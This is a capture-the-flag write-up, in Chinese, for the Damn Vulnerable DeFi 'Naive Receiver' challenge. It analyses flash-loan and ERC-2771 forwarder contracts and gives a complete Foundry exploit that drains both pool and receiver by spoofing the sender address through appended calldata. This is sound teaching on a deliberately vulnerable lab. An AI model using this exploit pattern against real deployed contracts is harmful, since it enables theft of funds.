## 题目 [Naive Receiver](https://github.com/theredguild/damn-vulnerable-defi/tree/v4.0.0/src/naive-receiver)
![](/img/DamnVulnerableDeFiV4/2.1.png)
**天真接收者**  
有一个池子里有 1000 WETH 余额，提供闪电贷。该池子收取固定费用为 1 WETH。这个池子通过与一个无权限的转发合约集成，支持元交易。  

一个用户部署了一个样本合约，余额为 10 WETH。看起来这个合约可以执行 WETH 的闪电贷。  

所有资金都有风险！需要将用户和池子里的所有 WETH 拯救出来，并存入指定的恢复账户。  

**解释：** 题目要求需要清空资金池和接收者合约中的所有 WETH 到恢复账户。并且从测试文件可以看出，需要两次或更少的交易中完成挑战。

## 前置知识
### [ERC-2771](https://eips.ethereum.org/EIPS/eip-2771)
ERC-2771 是元交易的标准。用户可以将交易的执行委托给第三方 Forwarder，通常称为中继器或转发器。  
通常合约中直接调用者的地址是使用 msg.sender 获取的，但在使用了 ERC-2771 的情况下，如果 msg.sender 是转发器角色的话，那么会截断传入的 calldata 并获取最后 20 个字节来作为交易的直接调用者地址。  

### Multicall
Multicall 是一个智能合约库，其作用是允许批量执行多个函数调用，从而减少交易成本。这个库通常用于优化 DApp 的性能和用户体验，特别是当需要进行多个读取操作时。  


## 合约分析
主要的三个合约是：  
`NaiveReceiverPool`: 提供闪电贷的池子，有 1000 个 WETH 可提供，同时支持 Forwarder 和 Multi call，还具有存款和取款功能。  
`FlashLoanReceiver`: 闪电贷接收者，初始余额 10 个 WETH。  
`BasicForwarder`: 中继器合约，用来执行交易。  

**任务1：清空`FlashLoanReceiver`合约的资产。**  
在 `FlashLoanReceiver` 合约的 `onFlashLoan` 函数中，并没有对发起闪电贷的地址做检查，所以任何地址都可以发起以该合约为名义的闪电贷，那么通过将接收者合约作为目标发起闪电贷，由于手续费为 1 WETH，那么调用 10 次，即可以耗尽。并且可以使用 Multi call 在一笔交易中完成。
``` solidity
    function onFlashLoan(address, address token, uint256 amount, uint256 fee, bytes calldata)
        external
        returns (bytes32)
    {
        assembly {
            // gas savings
            if iszero(eq(sload(pool.slot), caller())) {
                mstore(0x00, 0x48f5c3ed)
                revert(0x1c, 0x04)
            }
        }

        if (token != address(NaiveReceiverPool(pool).weth())) revert NaiveReceiverPool.UnsupportedCurrency();

        uint256 amountToBeRepaid;
        unchecked {
            amountToBeRepaid = amount + fee;
        }

        _executeActionDuringFlashLoan();

        // Return funds to pool
        WETH(payable(token)).approve(pool, amountToBeRepaid);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
```

**任务2：清空 `NaiveReceiverPool` 合约资产。**  
在`NaiveReceiverPool`合约中取资产的方式有 `withdraw`，并且存款和取款使用了一个自定义的 `_msgSender()` 函数，在这个函数中是取中继器发来的 `msg.data` 的最后 20 个字节作为 `msgSender` 。此时我想的是可能从这里入手，在 `msg.data` 最后增加一个地址。但是这个地址需要在 `deposits` 变量中有资产，不然扣除不了 `amount` 。
``` solidity
    function withdraw(uint256 amount, address payable receiver) external {
        // Reduce deposits
        deposits[_msgSender()] -= amount;
        totalDeposits -= amount;

        // Transfer ETH to designated receiver
        weth.transfer(receiver, amount);
    }

    function deposit() external payable {
        _deposit(msg.value);
    }

    function _deposit(uint256 amount) private {
        weth.deposit{value: amount}();

        deposits[_msgSender()] += amount;
        totalDeposits += amount;
    }

    function _msgSender() internal view override returns (address) {
        if (msg.sender == trustedForwarder && msg.data.length >= 20) {
            return address(bytes20(msg.data[msg.data.length - 20:]));
        } else {
            return super._msgSender();
        }
    }
```
之后仔细看 `flashLoan` 函数，发现手续费接收地址 `feeReceiver` 是会增加 `deposits` 的。  
``` solidity
    function flashLoan(IERC3156FlashBorrower receiver, address token, uint256 amount, bytes calldata data)
        external
        returns (bool)
    {
        if (token != address(weth)) revert UnsupportedCurrency();

        // Transfer WETH and handle control to receiver
        weth.transfer(address(receiver), amount);
        totalDeposits -= amount;

        if (receiver.onFlashLoan(msg.sender, address(weth), amount, FIXED_FEE, data) != CALLBACK_SUCCESS) {
            revert CallbackFailed();
        }

        uint256 amountWithFee = amount + FIXED_FEE;
        weth.transferFrom(address(receiver), address(this), amountWithFee);
        totalDeposits += amountWithFee;

        deposits[feeReceiver] += FIXED_FEE;

        return true;
    }
```
但是 `feeReceiver` 不就收到 10 个 WETH 吗，怎么把 1010 WETH 全拿走呢？  
后来根据测试文件和构造函数，可以看出 `deployer` 和 `feeReceiver` 是同一个地址，并且部署合约时，`deployer` 的 `deposits` 变量是有增加的。
``` solidity
    constructor(address _trustedForwarder, address payable _weth, address _feeReceiver) payable {
        weth = WETH(_weth);
        trustedForwarder = _trustedForwarder;
        feeReceiver = _feeReceiver;
        _deposit(msg.value);
    }
```

``` solidity
pool = new NaiveReceiverPool{value: WETH_IN_POOL}(address(forwarder), payable(weth), deployer);
```

## 题解
基于上述分析，我们可以得出攻击方法：  
1. 调用中继器 `forwarder` 合约执行后面的交易。
2. 中继器调用 `multicall` 函数，并且在 `call data` 中填入调用 10 次闪电贷，和调用一次 `withdraw`。
3. 并且在 `call data` 最后拼上 `feeReceiver` 地址。

调用 `forwarder` 之前还需要拼好签名。测试代码如下：  
``` solidity
    function test_naiveReceiver() public checkSolvedByPlayer {
        bytes[] memory callDatas = new bytes[](11);
        for(uint i = 0; i < 10; i++){
            callDatas[i] = abi.encodeCall(NaiveReceiverPool.flashLoan, (receiver, address(weth), 0, "0x"));
        }
        callDatas[10] = abi.encodePacked(abi.encodeCall(NaiveReceiverPool.withdraw, (WETH_IN_POOL + WETH_IN_RECEIVER, payable(recovery))),
            bytes32(uint256(uint160(pool.feeReceiver())))
        );
        bytes memory callData;
        callData = abi.encodeCall(pool.multicall, callDatas);
        BasicForwarder.Request memory request = BasicForwarder.Request(
            player,
            address(pool),
            0,
            30000000,
            forwarder.nonces(player),
            callData,
            block.timestamp
        );
        bytes32 requestHash = keccak256(
            abi.encodePacked(
                "\x19\x01",
                forwarder.domainSeparator(),
                forwarder.getDataHash(request)
            )
        );
        (uint8 v, bytes32 r, bytes32 s)= vm.sign(playerPk ,requestHash);
        bytes memory signature = abi.encodePacked(r, s, v);
        require(forwarder.execute(request, signature));
    }
```
**运行测试：**  
```
forge test --mp test/naive-receiver/NaiveReceiver.t.sol -vv
```

**测试通过：**  
```
Ran 2 tests for test/naive-receiver/NaiveReceiver.t.sol:NaiveReceiverChallenge
[PASS] test_assertInitialState() (gas: 34878)
[PASS] test_naiveReceiver() (gas: 416956)
Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 15.46ms (7.34ms CPU time)
```

